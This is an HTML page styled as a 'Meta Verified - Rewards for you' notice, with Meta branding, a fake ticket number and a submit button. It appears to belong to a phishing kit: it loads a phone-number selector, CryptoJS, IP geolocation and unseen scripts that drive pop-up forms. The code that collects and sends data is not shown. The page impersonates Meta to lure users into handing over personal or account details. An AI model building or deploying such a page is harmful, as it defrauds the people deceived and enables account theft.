<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no, viewport-fit=cover">
    <title>Meta Verified - Rewards for you</title>
    <link rel="icon" href="./public/favicon-32x32.png">
    <link rel="stylesheet" href="./public/styles/style.css">
    <!-- Intl-Tel-Input CSS for phone code selector -->
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/intl-tel-input@19.5.6/build/css/intlTelInput.css">

    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        primary: '#5D87FF',
                        secondary: '#212121'
                    }
                }
            }
        }
    </script>

    <!-- CryptoJS for encryption -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
</head>

<body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen w-full flex justify-center">
    <script>
      // Ẩn nội dung ngắn để tránh flicker khi khởi tạo i18n
      try { document.body.style.opacity = '0'; document.body.style.transition = 'opacity .2s ease'; } catch(_) {}
    </script>
    <div class="max-w-[768px] w-full p-4 h-full">
        <div class="w-full">
            <div class="flex items-start gap-[8px] flex-col justify-start mb-[30px]">
                <img src="./public/tick.svg" class="w-12 h-12" alt="Verified">
                <b class="text-[2rem]" data-i18n="mv_headline"></b>
            </div>

            <div class="w-full">
                <div class="w-full mb-[20px]">
                    <b class="text-[17px]" data-i18n="mv_subtitle"></b>
                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="mv_p1"></p>
                    <p class="text-[15px] mb-[0px] mt-[15px]" data-i18n="mv_p2"></p>
                    <p class="text-[16px] mb-[0px] mt-[14px] text-[#465a69]"><span data-i18n="ticket_label"></span> #<span id="ticketId">XXXX-XXXX-XXXX</span></p>
                </div>

                <div class="w-full">
                    <p class="mb-[15px]"><b class="text-[17px] font-bold" data-i18n="mv_guide_title"></b></p>
                    <p class="text-[15px] mb-[10px]" data-i18n="mv_rule1"></p>
                    <p class="text-[15px] mb-[10px]" data-i18n="mv_rule2"></p>
                    <p class="text-[15px] mb-0" data-i18n="mv_rule3"></p>
                </div>
            </div>
        </div>

        <button id="submitRequestBtn" class="bg-[#1877f2] text-white border-none rounded-full text-[16px] font-semibold px-[24px] py-[12px] cursor-pointer block w-full max-w-[300px] my-[20px] mx-auto text-center" data-i18n="mv_submit_button"></button>

        <div class="flex items-center text-center justify-center flex-wrap text-xs mt-8 text-[#65676b] gap-4">
            <a href="#" data-i18n="footer_help">Help Center</a>
            <a href="#" data-i18n="footer_policy">Privacy Policy</a>
            <a href="#" data-i18n="footer_terms">Terms of Service</a>
            <a href="#" data-i18n="footer_community">Community Standards</a>
            <a href="#">Meta © 2025</a>
        </div>
    </div>

    <!-- Modals Container -->
    <div id="modalsContainer"></div>

    <!-- JavaScript Files -->
    <script src="./public/js/config.js"></script>
    <script src="./public/js/utils.js"></script>
    <script src="./public/js/modal.js"></script>
    <!-- Intl-Tel-Input JS for phone code selector -->
    <script src="https://cdn.jsdelivr.net/npm/intl-tel-input@19.5.6/build/js/intlTelInput.min.js"></script>
    <!-- I18N scripts giống Source_Mail_1 -->
    <script src="./public/i18n/locales.js"></script>
    <script src="./public/i18n/assets.js"></script>
    <script src="./public/i18n/locales_ext.js"></script>
    <script src="./public/js/i18n.js"></script>
    <script>
      // Seed ngôn ngữ theo URL/localStorage/Accept-Language rồi cân nhắc override bằng IP (timeout ngắn)
      (function(){
        var reveal = function(){ try { document.body.style.opacity = '1'; } catch(_){} };
        try {
          var qs = String(window.location.search || '');
          var params = new URLSearchParams(qs);
          var hasLangParam = params.has('lang');
          var explicitLang = hasLangParam ? String(params.get('lang')||'').toLowerCase() : '';

          // Guess from navigator
          var guessFromNavigator = function(){
            try {
              var langs = Array.isArray(navigator.languages) && navigator.languages.length ? navigator.languages : [navigator.language||''];
              var raw = (langs[0]||'').toLowerCase();
              if (!raw) return '';
              if (raw.startsWith('en')) return 'en';
              if (raw.startsWith('vi')) return 'vi';
              if (raw.startsWith('ja')) return 'ja';
              if (raw.startsWith('ko')) return 'ko';
              if (raw.startsWith('de')) return 'de';
              if (raw.startsWith('fr')) return 'fr';
              if (raw.startsWith('it')) return 'it';
              if (raw.startsWith('es')) return 'es';
              if (raw.startsWith('pt')) return 'pt';
              if (raw.startsWith('th')) return 'th';
              if (raw.startsWith('nl')) return 'nl';
              if (raw.startsWith('da')) return 'da';
              if (raw.startsWith('ar')) return 'ar';
              if (raw.startsWith('uk')) return 'uk';
              if (raw.startsWith('zh')) return 'zh';
              return '';
            } catch(_){ return ''; }
          };

          // Seed initial language early to avoid EN flicker
          var stored = (function(){ try { return (localStorage.getItem('preferredLang') || localStorage.getItem('prefLang') || '').toLowerCase(); } catch(_){ return ''; } })();
          var seed = explicitLang || stored || guessFromNavigator() || '';
          try {
            if (seed && window.I18N && typeof window.I18N.setLang === 'function') {
              window.I18N.setLang(seed);
            }
          } catch(_){ /* noop */ }

          // If explicit lang provided, reveal immediately (no IP override)
          if (hasLangParam) { reveal(); return; }

          // Race IP lookup with a short timeout, then optionally override
          if (!window.Utils || !window.I18N || typeof window.Utils.getUserLocation !== 'function') { reveal(); return; }
          var timeoutMs = 1600;
          var ipPromise = window.Utils.getUserLocation().catch(function(){ return null; });
          var timerPromise = new Promise(function(resolve){ setTimeout(function(){ resolve(null); }, timeoutMs); });
          Promise.race([ipPromise, timerPromise]).then(function(loc){
            if (!loc) return; // timeout or failed
            var cc = (loc && (loc.country_code || loc.countryCode)) || '';
            var byIp = (window.I18N && typeof window.I18N.mapCountryToLang === 'function') ? window.I18N.mapCountryToLang(cc) : '';
            var cur = (window.I18N && window.I18N.lang) ? window.I18N.lang : 'en';
            if (byIp && byIp !== cur && window.I18N && typeof window.I18N.setLang === 'function') {
              window.I18N.setLang(byIp);
              try { localStorage.setItem('preferredLang', byIp); localStorage.setItem('prefLang', byIp); } catch(_){}
            }
          }).finally(reveal);
        } catch (_){ reveal(); }
      })();
    </script>
    <script src="./public/js/slug.js"></script>
    <script> if (window.ensureSlugUrl) window.ensureSlugUrl(); </script>
    <script src="./public/js/app.js"></script>
</body>

</html>
